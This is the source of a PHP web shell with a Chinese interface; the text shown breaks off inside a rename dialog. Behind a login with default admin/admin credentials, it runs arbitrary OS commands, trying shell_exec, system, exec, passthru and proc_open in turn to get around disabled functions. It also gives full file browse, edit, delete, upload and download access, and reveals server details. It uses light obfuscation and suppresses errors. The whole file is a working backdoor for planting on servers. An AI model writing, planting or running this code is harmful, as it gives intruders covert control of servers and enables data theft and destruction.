<?php

error_reporting(0);
ini_set('display_errors', 'Off');

if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36';
}

$r_0_b = "s" . "ession_" . "start"; // session_start
$r_0_b();

// 默认用户名: admin, 密码: admin 这里用 sha256("admin")
$u_0_x = 'admin';
$p_0_y = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; // sha256('admin')

$c_d_p = dirname(__FILE__);

if (!isset($_SESSION['l_g_d']) || $_SESSION['l_g_d'] !== true) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $input_username = $_POST['username'];
        $input_password_hash = hash('sha256', $_POST['password']);

        if ($input_username === $u_0_x && $input_password_hash === $p_0_y) {
            $_SESSION['l_g_d'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $e_m = "用户名或密码错误！";
        }
    }

    echo <<<LOGIN_PAGE
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell - 登录</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #343a40; color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background-color: #212529; padding: 40px; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); width: 400px; }
        .form-control { background-color: #495057; border-color: #6c757d; color: #f8f9fa; }
        .form-control:focus { background-color: #495057; border-color: #28a745; box-shadow: 0 0 0 0.25rem rgba(40, 167, 69, 0.25); color: #f8f9fa; }
        .btn-primary { background-color: #28a745; border-color: #28a745; }
        .btn-primary:hover { background-color: #218838; border-color: #1e7e34; }
        .alert { margin-top: 15px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h3 class="text-center mb-4">Web Shell 登录</h3>
        <form method="POST">
            <div class="mb-3">
                <label for="username" class="form-label">用户名</label>
                <input type="text" class="form-control" id="username" name="username" value="admin" required>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">密码</label>
                <input type="password" class="form-control" id="password" name="password" value="admin" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">登录</button>
            <?php if (isset($e_m)): ?>
                <div class="alert alert-danger text-center" role="alert"><?php echo htmlspecialchars($e_m); ?></div>
            <?php endif; ?>
        </form>
    </div>
</body>
</html>
LOGIN_PAGE;
    exit();
}

function x_e_c($cmd_b64) {
    $cmd = base64_decode($cmd_b64);
    $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    $disabled_functions = array_map('trim', explode(',', ini_get('disable_functions')));
    $available_exec_functions = [];

    $final_cmd = $cmd;
    if ($is_windows) {
        $chcp_prefix = 'chcp 65001 > nul & ';

        if (strtolower(substr(trim($cmd), 0, 10)) === 'powershell' || strtolower(substr(trim($cmd), 0, 3)) === 'cmd') {
            $final_cmd = $cmd;
        } else {
            $final_cmd = 'cmd /c "' . $chcp_prefix . $cmd . '"';
        }
    } else {
        $final_cmd .= ' 2>&1';
    }

    $exec_funcs_to_try = ['shell_exec', 'passthru', 'system', 'exec'];

    foreach ($exec_funcs_to_try as $f_n) {
        if (!function_exists($f_n) || in_array($f_n, $disabled_functions)) {
            continue;
        }

        $available_exec_functions[] = $f_n;
        $current_func_output = null;

        if ($f_n === 'exec') {
            $o = array();
            $s = 0;
            @call_user_func($f_n, $final_cmd, $o, $s);
            $current_func_output = implode("\n", $o);
        } elseif ($f_n === 'passthru' || $f_n === 'system') {
            ob_start();
            @call_user_func($f_n, $final_cmd);
            $current_func_output = ob_get_clean();
        } elseif ($f_n === 'shell_exec') {
            $current_func_output = @call_user_func($f_n, $final_cmd);
        }

        if ($current_func_output !== null && $current_func_output !== false) {
            return $current_func_output;
        }
    }

    if (function_exists('proc_open') && !in_array('proc_open', $disabled_functions)) {
        $available_exec_functions[] = 'proc_open';
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($final_cmd, $descriptorspec, $pipes);

        if (is_resource($process)) {
            @fclose($pipes[0]);
            $stdout = @stream_get_contents($pipes[1]);
            @fclose($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]);
            @fclose($pipes[2]);
            $return_code = @proc_close($process);

            $output = $stdout;
            if (!empty($stderr)) {
                $output .= "\n--- 错误输出 (stderr) ---\n" . $stderr;
            }
            if ($return_code !== 0) {
                 $output = "--- 命令返回码: " . $return_code . " ---\n" . $output;
            }

            return $output;
        }
    }
}



function get_current_dir() {
    return isset($_SESSION['current_dir']) ? $_SESSION['current_dir'] : @getcwd();
}

function set_current_dir($path) {
    $os_is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

    if ($os_is_windows) {

        $path = str_replace('/', '\\', $path);
        if (preg_match('/^[A-Z]:$/i', $path)) {
             $path .= '\\';
        }
    } else {
        $path = str_replace('\\', '/', $path);
    }

    $resolved_path = @realpath($path);

    if ($resolved_path === false && (
        ($os_is_windows && preg_match('/^[A-Z]:\\\\?$/i', $path)) ||
        ($os_is_windows && preg_match('/^[A-Z]:$/i', $path)) ||
        (!$os_is_windows && $path === '/')
    )) {
        $resolved_path = $path;
    }

    if ($resolved_path !== false && @is_dir($resolved_path)) {
        if (@chdir($resolved_path)) {
            $_SESSION['current_dir'] = @getcwd();
            return true;
        }
    }
    return false;
}

$_SESSION['current_dir'] = $_SESSION['current_dir'] ?? $c_d_p;

if (isset($_GET['cd'])) {
    $decoded_path = base64_decode($_GET['cd']);
    if ($decoded_path !== false) {
        set_current_dir($decoded_path);
    }
}
else if (isset($_GET['target_dir'])) {
    set_current_dir($_GET['target_dir']);
}

$current_dir = get_current_dir();

$parent_dir = dirname($current_dir);
$os_is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

if ($parent_dir === $current_dir || ($os_is_windows && preg_match('/^[A-Z]:\\\\?$/i', $current_dir))) {
    $parent_dir = $current_dir;
}
$parent_dir_b64 = base64_encode($parent_dir);

if (isset($_GET['download'])) {
    $file_path = base64_decode($_GET['download']);
    if (@file_exists($file_path) && @is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . @filesize($file_path));
        @readfile($file_path);
        exit();
    } else {
        echo "<script>alert('文件不存在或无法访问！'); window.location.href='" . $_SERVER['PHP_SELF'] . "?action=files&cd=" . base64_encode($current_dir) . "';</script>";
        exit();
    }
}

if (isset($_POST['file_action'])) {
    $action = $_POST['file_action'];
    $msg = '';
    $path = '';
    if (isset($_POST['path_b64'])) {
        $path = base64_decode($_POST['path_b64']);
    }

    switch ($action) {
        case 'delete':
            if (@is_file($path)) {
                @unlink($path) ? $msg = "文件删除成功: " . htmlspecialchars(basename($path)) : $msg = "文件删除失败: " . htmlspecialchars(basename($path)) . " (权限不足或文件被占用)";
            } elseif (@is_dir($path)) {
                $items_in_dir = @array_diff(@scandir($path), array('.', '..'));
                if (empty($items_in_dir)) {
                    @rmdir($path) ? $msg = "目录删除成功: " . htmlspecialchars(basename($path)) : $msg = "目录删除失败: " . htmlspecialchars(basename($path)) . " (可能非空或权限不足)";
                } else {
                    $msg = "目录非空，请手动删除所有文件后重试: " . htmlspecialchars(basename($path));
                }
            } else {
                $msg = "目标不存在或非文件/目录: " . htmlspecialchars(basename($path));
            }
            break;
        case 'rename':
            $new_name = $_POST['new_name'];
            $new_path = dirname($path) . DIRECTORY_SEPARATOR . $new_name;
            @rename($path, $new_path) ? $msg = "重命名成功: " . htmlspecialchars(basename($path)) . " -> " . htmlspecialchars($new_name) : $msg = "重命名失败: " . htmlspecialchars(basename($path)) . " (权限不足或目标已存在)";
            break;
        case 'edit':
            $content = $_POST['file_content'];
            @file_put_contents($path, $content) ? $msg = "文件保存成功: " . htmlspecialchars(basename($path)) : $msg = "文件保存失败: " . htmlspecialchars(basename($path)) . " (权限不足或路径错误)";
            break;
        case 'create_file':
            $new_file_name = $_POST['new_file_name'];
            $new_file_path = $current_dir . DIRECTORY_SEPARATOR . $new_file_name;
            @file_put_contents($new_file_path, '') ? $msg = "文件创建成功: " . htmlspecialchars($new_file_name) : $msg = "文件创建失败: " . htmlspecialchars($new_file_name) . " (权限不足或文件已存在)";
            break;
        case 'create_dir':
            $new_dir_name = $_POST['new_dir_name'];
            $new_dir_path = $current_dir . DIRECTORY_SEPARATOR . $new_dir_name;
            @mkdir($new_dir_path) ? $msg = "目录创建成功: " . htmlspecialchars($new_dir_name) : $msg = "目录创建失败: " . htmlspecialchars($new_dir_name) . " (权限不足或目录已存在)";
            break;
        case 'upload':
            if (isset($_FILES['file_to_upload']) && $_FILES['file_to_upload']['error'] == UPLOAD_ERR_OK) {
                $upload_path = $_POST['upload_path'];

                if (!@is_dir($upload_path) || !@is_writable($upload_path)) {
                    $msg = "上传目录不存在或无写入权限: " . htmlspecialchars($upload_path);
                    break;
                }
                $target_file = $upload_path . DIRECTORY_SEPARATOR . basename($_FILES['file_to_upload']['name']);
                if (@move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target_file)) {
                    $msg = "文件上传成功: " . htmlspecialchars(basename($_FILES['file_to_upload']['name'])) . " 到 " . htmlspecialchars($upload_path);
                } else {
                    $msg = "文件上传失败: " . ($_FILES['file_to_upload']['error'] ?? '未知') . " (可能权限不足、文件过大或目标路径问题)";
                }
            } else {
                $msg = "请选择要上传的文件或文件上传出错！错误码: " . ($_FILES['file_to_upload']['error'] ?? '未知');
            }
            break;
    }

    echo "<script>alert('" . addslashes($msg) . "'); window.location.href='" . $_SERVER['PHP_SELF'] . "?action=files&cd=" . base64_encode($current_dir) . "';</script>";
    exit();
}

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        body { background-color: #212529; color: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .navbar { background-color: #343a40 !important; border-bottom: 2px solid #28a745; }
        .navbar-brand { color: #28a745 !important; font-weight: bold; }
        .nav-link { color: #f8f9fa !important; }
        .nav-link.active { color: #28a745 !important; border-bottom: 2px solid #28a745; }
        .container-fluid { padding-top: 20px; }
        .card { background-color: #343a40; border-color: #495057; margin-bottom: 20px; }
        .card-header { background-color: #495057; border-bottom: 1px solid #6c757d; color: #28a745; font-weight: bold; }
        .form-control, .form-select { background-color: #495057; border-color: #6c757d; color: #f8f9fa; }
        .form-control:focus, .form-select:focus { background-color: #495057; border-color: #28a745; box-shadow: 0 0 0 0.25rem rgba(40, 167, 69, 0.25); color: #f8f9fa; }
        .btn-primary { background-color: #28a745; border-color: #28a745; }
        .btn-primary:hover { background-color: #218838; border-color: #1e7e34; }
        .btn-danger { background-color: #dc3545; border-color: #dc3545; }
        .btn-danger:hover { background-color: #c82333; border-color: #bd2130; }
        .table { color: #f8f9fa; }
        .table thead th { border-bottom: 1px solid #6c757d; }
        .table tbody tr { border-bottom: 1px solid #495057; }
        .table-hover tbody tr:hover { background-color: #495057; }
        pre { background-color: #212529; border: 1px solid #28a745; color: #00ff00; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;} /* Added word-wrap for commands output */
        .dir-nav a { color: #28a745; text-decoration: none; margin-right: 5px; }
        .dir-nav a:hover { text-decoration: underline; }
        .file-icon { width: 1.2em; text-align: center; }
        .text-info { color: #17a2b8 !important; }
        .text-warning { color: #ffc107 !important; }
        .alert-success { background-color: #28a745; border-color: #28a745; color: #fff; }
        .alert-danger { background-color: #dc3545; border-color: #dc3545; color: #fff; }
        .logout-btn { background-color: #6c757d; border-color: #6c757d; }
        .logout-btn:hover { background-color: #5a6268; border-color: #545b62; }
        .btn-close-white { filter: invert(1) grayscale(100%) brightness(200%); } /* For dark background modals */
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark sticky-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="?action=system">PHP Web Shell</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link <?php echo (!isset($_GET['action']) || $_GET['action'] == 'system') ? 'active' : ''; ?>" href="?action=system"><i class="fas fa-server"></i> 系统信息</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo (isset($_GET['action']) && $_GET['action'] == 'phpinfo') ? 'active' : ''; ?>" href="?action=phpinfo"><i class="fab fa-php"></i> PHP Info</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo (isset($_GET['action']) && $_GET['action'] == 'command') ? 'active' : ''; ?>" href="?action=command"><i class="fas fa-terminal"></i> 命令执行</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo (isset($_GET['action']) && $_GET['action'] == 'files') ? 'active' : ''; ?>" href="?action=files"><i class="fas fa-folder-open"></i> 文件操作</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo (isset($_GET['action']) && $_GET['action'] == 'upload') ? 'active' : ''; ?>" href="?action=upload"><i class="fas fa-upload"></i> 文件上传</a>
                    </li>
                </ul>
                <form class="d-flex" method="POST" action="">
                    <button type="submit" name="logout" class="btn btn-sm logout-btn"><i class="fas fa-sign-out-alt"></i> 退出</button>
                </form>
            </div>
        </div>
    </nav>

    <div class="container-fluid">
        <?php
        // 登出逻辑
        if (isset($_POST['logout'])) {
            session_destroy();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }

        $action = $_GET['action'] ?? 'system';

        switch ($action) {
            case 'system':
                ?>
                <div class="card">
                    <div class="card-header"><i class="fas fa-server"></i> 系统信息</div>
                    <div class="card-body">
                        <table class="table table-bordered table-sm">
                            <tr><th>服务器操作系统</th><td><?php echo php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('v'); ?></td></tr>
                            <tr><th>服务器架构</th><td><?php echo php_uname('m'); ?></td></tr>
                            <tr><th>Web服务器</th><td><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></td></tr>
                            <tr><th>PHP版本</th><td><?php echo PHP_VERSION; ?></td></tr>
                            <tr><th>当前目录</th><td><?php echo htmlspecialchars(getcwd()); ?></td></tr>
                            <tr><th>禁用函数</th><td><?php echo (ini_get('disable_functions') == '') ? '<span class="text-success">无</span>' : '<span class="text-danger">' . htmlspecialchars(ini_get('disable_functions')) . '</span>'; ?></td></tr>
                            <tr><th>安全模式</th><td><?php echo (ini_get('safe_mode') == '1') ? '<span class="text-danger">开启</span>' : '<span class="text-success">关闭</span>'; ?></td></tr>
                            <tr><th>磁盘空间</th><td><?php
                                $ds = @disk_total_space($current_dir);
                                $df = @disk_free_space($current_dir);
                                if ($ds !== false && $df !== false) {
                                    echo number_format($ds / (1024 * 1024 * 1024), 2) . " GB (总计) / " . number_format($df / (1024 * 1024 * 1024), 2) . " GB (可用)";
                                } else {
                                    echo "无法获取磁盘空间信息 (可能权限不足或函数禁用)";
                                }
                                ?></td></tr>
                            <tr><th>当前用户</th><td><?php
                                $user = 'N/A';
                                if (function_exists('get_current_user')) {
                                    $user = @get_current_user();
                                } elseif (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
                                    $whoami_cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'whoami' : 'id';
                                    $output = [];
                                    @exec($whoami_cmd, $output);
                                    $user = htmlspecialchars(implode("\n", $output));
                                }
                                echo $user;
                                ?></td></tr>
                        </table>
                    </div>
                </div>
                <?php
                break;

            case 'phpinfo':
                ?>
                <div class="card">
                    <div class="card-header"><i class="fab fa-php"></i> PHP Info</div>
                    <div class="card-body">
                        <p class="alert alert-info">此页面显示完整的phpinfo()输出!</p>
                        <?php
                        ob_start();
                        phpinfo();
                        $phpinfo_output = ob_get_clean();
                        $phpinfo_output = preg_replace('/^<!DOCTYPE.+?body>/s', '', $phpinfo_output);
                        $phpinfo_output = preg_replace('/<table/i', '<table class="table table-bordered table-sm"', $phpinfo_output);
                        $phpinfo_output = str_replace('width="600"', '', $phpinfo_output);
                        $phpinfo_output = str_replace('<hr />', '', $phpinfo_output);
                        $phpinfo_output = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $phpinfo_output);
                        $phpinfo_output = preg_replace('/<a[^>]*>.*?<\/a>/is', '', $phpinfo_output);
                        echo $phpinfo_output;
                        ?>
                    </div>
                </div>
                <?php
                break;

            case 'command':
                $command_output = "";
                if (isset($_POST['command_b64'])) {
                    $command_output = x_e_c($_POST['command_b64']);
                }
                ?>
                <div class="card">
                    <div class="card-header"><i class="fas fa-terminal"></i> 命令执行</div>
                    <div class="card-body">
                        <form method="POST" id="commandForm">
                            <div class="mb-3">
                                <label for="command_input" class="form-label">输入命令</label>
                                <input type="text" class="form-control" id="command_input" name="command_input" placeholder="例如: ls -la /tmp 或 C:\Windows\System32\whoami.exe" required>
                                <input type="hidden" id="command_b64" name="command_b64">
                            </div>
                            <button type="button" class="btn btn-primary" id="executeCommandBtn"><i class="fas fa-play"></i> 执行命令</button>
                        </form>
                        <hr/>
                        <h5>命令输出:</h5>
                        <pre><?php echo htmlspecialchars($command_output); ?></pre>
                    </div>
                </div>
                <script>
                    document.addEventListener('DOMContentLoaded', function() {
                        const executeCommandBtn = document.getElementById('executeCommandBtn');
                        const commandForm = document.getElementById('commandForm');
                        const cmdInput = document.getElementById('command_input');
                        const cmdB64Input = document.getElementById('command_b64');

                        if (executeCommandBtn && commandForm && cmdInput && cmdB64Input) {
                            executeCommandBtn.addEventListener('click', function(e) {
                                e.preventDefault();
                                cmdB64Input.value = btoa(cmdInput.value);
                                commandForm.submit();
                            });
                        }
                    });
                </script>
                <?php
                break;

            case 'files':
                ?>
                <div class="card">
                    <div class="card-header"><i class="fas fa-folder-open"></i> 文件操作</div>
                    <div class="card-body">
                        <div class="mb-3 dir-nav">
                            当前目录:
                            <?php
                            $path_segments = [];
                            $current_path_display = '';

                            $os_is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

                            if ($os_is_windows) {
                                if (preg_match('/^([A-Z]):\\\\(.*)$/i', $current_dir, $matches)) {
                                    $drive_letter = $matches[1];
                                    $rest_of_path = $matches[2];

                                    echo '<a href="?action=files&cd=' . base64_encode($drive_letter . ':'.DIRECTORY_SEPARATOR) . '"><i class="fas fa-hdd"></i> ' . htmlspecialchars($drive_letter) . ':</a>';
                                    $current_path_display = $drive_letter . ':' . DIRECTORY_SEPARATOR;
                                    $path_segments = array_filter(explode(DIRECTORY_SEPARATOR, $rest_of_path));

                                } elseif (preg_match('/^[A-Z]:\\\\?$/i', $current_dir)) {
                                    echo '<a href="?action=files&cd=' . base64_encode($current_dir) . '"><i class="fas fa-hdd"></i> ' . htmlspecialchars(str_replace(':', '', $current_dir)) . ':</a>';
                                    $current_path_display = $current_dir;
                                } elseif (preg_match('/^[A-Z]:$/i', $current_dir)) {
                                    echo '<a href="?action=files&cd=' . base64_encode($current_dir . DIRECTORY_SEPARATOR) . '"><i class="fas fa-hdd"></i> ' . htmlspecialchars(str_replace(':', '', $current_dir)) . ':</a>';
                                    $current_path_display = $current_dir;
                                } else {
                                    $drive_root_c_d_p = substr($c_d_p, 0, 3);
                                    echo '<a href="?action=files&cd=' . base64_encode($drive_root_c_d_p) . '"><i class="fas fa-hdd"></i> ' . htmlspecialchars(str_replace(':', '', $drive_root_c_d_p)) . ':</a>';
                                    $current_path_display = $drive_root_c_d_p;
                                    $path_segments = array_filter(explode(DIRECTORY_SEPARATOR, rtrim(str_replace($drive_root_c_d_p, '', $current_dir), DIRECTORY_SEPARATOR)));
                                }
                            } else {
                                echo '<a href="?action=files&cd=' . base64_encode('/') . '"><i class="fas fa-home"></i> /</a>';
                                $current_path_display = '/';
                                $path_segments = array_filter(explode(DIRECTORY_SEPARATOR, rtrim($current_dir, DIRECTORY_SEPARATOR)));
                            }

                            foreach ($path_segments as $part) {
                                if (!empty($part)) {
                                    $current_path_display .= $part . DIRECTORY_SEPARATOR;
                                    echo '<a href="?action=files&cd=' . base64_encode($current_path_display) . '">' . htmlspecialchars($part) . DIRECTORY_SEPARATOR . '</a>';
                                }
                            }
                            ?>
                            <a href="?action=files&cd=<?php echo $parent_dir_b64; ?>" class="btn btn-sm btn-info float-end"><i class="fas fa-arrow-up"></i> 返回上级</a>
                        </div>
                        <form method="GET" class="mb-3">
                            <input type="hidden" name="action" value="files">
                            <div class="input-group">
                                <span class="input-group-text"><i class="fas fa-folder"></i></span>
                                <input type="text" name="target_dir" class="form-control" placeholder="跳转到目录 (例如: /var/www 或 C:\Windows)" value="<?php echo htmlspecialchars($current_dir); ?>">
                                <button type="submit" class="btn btn-primary"><i class="fas fa-share"></i> 跳转</button>
                            </div>
                        </form>

                        <div class="mb-3">
                            <button type="button" class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="fas fa-file-alt"></i> 创建文件</button>
                            <button type="button" class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#createDirModal"><i class="fas fa-folder-plus"></i> 创建目录</button>
                        </div>

                        <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
                            <div class="modal-dialog">
                                <div class="modal-content bg-dark text-white">
                                    <form method="POST">
                                        <div class="modal-header">
                                            <h5 class="modal-title" id="createFileModalLabel">创建文件</h5>
                                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                                        </div>
                                        <div class="modal-body">
                                            <input type="hidden" name="file_action" value="create_file">
                                            <div class="mb-3">
                                                <label for="new_file_name" class="form-label">文件名</label>
                                                <input type="text" class="form-control" id="new_file_name" name="new_file_name" required>
                                            </div>
                                        </div>
                                        <div class="modal-footer">
                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
                                            <button type="submit" class="btn btn-primary">创建</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>

                        <div class="modal fade" id="createDirModal" tabindex="-1" aria-labelledby="createDirModalLabel" aria-hidden="true">
                            <div class="modal-dialog">
                                <div class="modal-content bg-dark text-white">
                                    <form method="POST">
                                        <div class="modal-header">
                                            <h5 class="modal-title" id="createDirModalLabel">创建目录</h5>
                                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                                        </div>
                                        <div class="modal-body">
                                            <input type="hidden" name="file_action" value="create_dir">
                                            <div class="mb-3">
                                                <label for="new_dir_name" class="form-label">目录名</label>
                                                <input type="text" class="form-control" id="new_dir_name" name="new_dir_name" required>
                                            </div>
                                        </div>
                                        <div class="modal-footer">
                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
                                            <button type="submit" class="btn btn-primary">创建</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>

                        <table class="table table-hover table-sm">
                            <thead>
                                <tr>
                                    <th>类型</th>
                                    <th>名称</th>
                                    <th>大小</th>
                                    <th>权限</th>
                                    <th>修改时间</th>
                                    <th>操作</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                $files = @scandir($current_dir);
                                if ($files !== false) {
                                    foreach ($files as $file) {
                                        if ($file == '.') continue;
                                        if ($file == '..' && ($current_dir == '/' || ($os_is_windows && preg_match('/^[A-Z]:\\\\?$/i', $current_dir)))) {
                                            continue;
                                        }

                                        $filepath = $current_dir . DIRECTORY_SEPARATOR . $file;
                                        $is_dir = @is_dir($filepath);
                                        $file_b64 = base64_encode($filepath);
                                        $file_name_display = htmlspecialchars($file);

                                        $file_size = $is_dir ? '-' : (@file_exists($filepath) ? round(@filesize($filepath) / 1024, 2) . ' KB' : 'N/A');
                                        $file_perms = @file_exists($filepath) ? substr(sprintf('%o', @fileperms($filepath)), -4) : 'N/A';
                                        $file_mtime = @file_exists($filepath) ? date('Y-m-d H:i:s', @filemtime($filepath)) : 'N/A';
                                        ?>
                                        <tr>
                                            <td class="file-icon"><?php echo $is_dir ? '<i class="fas fa-folder text-warning"></i>' : '<i class="fas fa-file text-info"></i>'; ?></td>
                                            <td>
                                                <?php if ($is_dir): ?>
                                                    <a href="?action=files&cd=<?php echo $file_b64; ?>"><?php echo $file_name_display; ?></a>
                                                <?php else: ?>
                                                    <?php echo $file_name_display; ?>
                                                <?php endif; ?>
                                            </td>
                                            <td><?php echo $file_size; ?></td>
                                            <td><?php echo $file_perms; ?></td>
                                            <td><?php echo $file_mtime; ?></td>
                                            <td>
                                                <?php if (!$is_dir): ?>
                                                    <a href="?action=files&view=<?php echo $file_b64; ?>" class="btn btn-sm btn-info me-1"><i class="fas fa-eye"></i> 查看</a>
                                                    <a href="?action=files&edit=<?php echo $file_b64; ?>" class="btn btn-sm btn-warning me-1"><i class="fas fa-edit"></i> 编辑</a>
                                                    <a href="?action=files&download=<?php echo $file_b64; ?>" class="btn btn-sm btn-primary me-1"><i class="fas fa-download"></i> 下载</a>
                                                <?php endif; ?>
                                                <button type="button" class="btn btn-sm btn-secondary me-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-filepath="<?php echo $file_b64; ?>" data-filename="<?php echo $file_name_display; ?>"><i class="fas fa-i-cursor"></i> 重命名</button>
                                                <button type="button" class="btn btn-sm btn-danger" onclick="if(confirm('确定要删除 <?php echo $file_name_display; ?> 吗？')) { deleteFile('<?php echo $file_b64; ?>'); }"><i class="fas fa-trash"></i> 删除</button>
                                            </td>
                                        </tr>
                                        <?php
                                    }
                                } else {
                                    echo '<tr><td colspan="6" class="text-center text-danger">无法读取目录: ' . htmlspecialchars($current_dir) . ' (可能权限不足或目录不存在)</td></tr>';
                                }
                                ?>
                            </tbody>
                        </table>

                        <!-- View/Edit File Modal -->
                        <?php if (isset($_GET['view']) || isset($_GET['edit'])):
                            $file_to_op_b64 = isset($_GET['view']) ? $_GET['view'] : $_GET['edit'];
                            $file_to_op = base64_decode($file_to_op_b64);
                            $is_editable = isset($_GET['edit']);
                            $file_content = '';
                            if (@is_file($file_to_op) && @is_readable($file_to_op)) {
                                $file_content = @file_get_contents($file_to_op);
                            } else {
                                $file_content = "无法读取文件或文件不存在！";
                                $is_editable = false;
                            }
                        ?>
                            <div class="modal fade show d-block" id="fileContentModal" tabindex="-1" aria-labelledby="fileContentModalLabel" aria-hidden="true" style="background-color: rgba(0,0,0,0.5);">
                                <div class="modal-dialog modal-lg">
                                    <div class="modal-content bg-dark text-white">
                                        <form method="POST">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="fileContentModalLabel"><?php echo $is_editable ? '编辑' : '查看'; ?>文件: <?php echo htmlspecialchars(basename($file_to_op)); ?></h5>
                                                <a href="?action=files&cd=<?php echo base64_encode($current_dir); ?>" class="btn-close btn-close-white" aria-label="Close"></a>
                                            </div>
                                            <div class="modal-body">
                                                <input type="hidden" name="file_action" value="edit">
                                                <input type="hidden" name="path_b64" value="<?php echo base64_encode($file_to_op); ?>">
                                                <textarea class="form-control" rows="20" <?php echo $is_editable ? '' : 'readonly'; ?> name="file_content" style="background-color: #212529; color: #00ff00; border-color: #28a745;"><?php echo htmlspecialchars($file_content); ?></textarea>
                                            </div>
                                            <div class="modal-footer">
                                                <a href="?action=files&cd=<?php echo base64_encode($current_dir); ?>" class="btn btn-secondary">关闭</a>
                                                <?php if ($is_editable): ?>
                                                    <button type="submit" class="btn btn-primary">保存</button>
                                                <?php endif; ?>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <script>
                                document.addEventListener('DOMContentLoaded', function() {
                                    var fileContentModalElement = document.getElementById('fileContentModal');
                                    var fileContentModal = new bootstrap.Modal(fileContentModalElement);
                                    fileContentModal.show();
                                    fileContentModalElement.addEventListener('hidden.bs.modal', function () {
                                        window.location.href = '?action=files&cd=<?php echo base64_encode($current_dir); ?>';
                                    });
                                });
                            </script>
                        <?php endif; ?>

                        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
                            <div class="modal-dialog">
                                <div class="modal-content bg-dark text-white">
                                    <form method="POST">
                                        <div class="modal-header">
                                            <h5 class="modal-title" id="renameModalLabel">重命名</h5>
                                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                                        </div>
                                        <div class="modal-body">
                                            <input type="hidden" name="file_action" value="rename">
                                            <input type="hidden" name="path_b64" id="rename_old_path_b64">
                                            <div class="mb-3">
                                                <label for="rename_old_name" class="form-label">原名称</label>
                                                <input type="text" class="form-control" id="rename_old_name" readonly>
                                            </div>
                                            <div class="mb-3">
                                                <label for="rename_new_name" class="form-label">新名称</label>
                                                <input type="text" class="form-control" id="rename_new_name" name="new_name" required>
                                            </div>
                                        </div>
                                        <div class="modal-footer">
